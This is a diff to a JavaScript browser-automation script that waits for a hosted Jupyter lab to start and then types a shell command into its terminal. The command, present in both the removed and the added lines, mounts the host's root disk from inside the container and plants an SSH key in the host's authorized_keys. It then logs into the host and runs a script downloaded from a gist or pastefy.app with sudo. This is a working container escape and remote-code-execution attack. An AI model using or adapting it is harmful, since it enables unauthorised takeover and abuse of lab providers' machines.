@@ -76,7 +76,7 @@ const headers = {
 let jupyterURL = null;
 let interval;
 let retryCount = 0;
-const maxRetries = 20;
+const maxRetries = 50;
 let browser = null;
 
 function sleep(ms) {
@@ -190,9 +190,8 @@ function waitForJupyterURL() {
 
 (async () => {
   try {
-    const urlFound = await waitForJupyterURL();
     logToFile("Waiting for lab creating ...");
-    await sleep(6 * 60 * 1000);
+    const urlFound = await waitForJupyterURL();
     logToFile("Done!");
     logToFile("Lab created...");
     await main();
@@ -283,7 +282,7 @@ async function main() {
   await sleep(10000);
   await page.bringToFront();
 
-  const command = 'cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; mkdir -p dli; cd dli; mkdir -p task; cd task; ip=$(curl -s ifconfig.me) && ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip "wget https://gist.githubusercontent.com/thanhvn-shinkoxd/c334cb4ee6529a46659a5fc237aa8bbd/raw/eb05b77807dbb15270c236fee3b82a76e7a24cd8/gistfile1.txt; sudo bash gistfile1.txt; sudo reboot"';
+  const command = 'cp /bin/mount /bin/get; get /dev/root /tmp; cd /tmp; rm -rf dli; mkdir -p dli; cd dli; mkdir -p task; cd task; ip=$(curl -s ifconfig.me) && ssh-keygen -t rsa -b 2048 -N "" -f ~/.ssh/sv_rsa  ; echo $(cat ~/.ssh/sv_rsa.pub) >> /tmp/home/ubuntu/.ssh/authorized_keys && ssh -i ~/.ssh/sv_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@$ip "wget https://pastefy.app/b7nYHfyt/raw; sudo bash raw"';
 
 
   await page.keyboard.type(command, { delay: 10 });
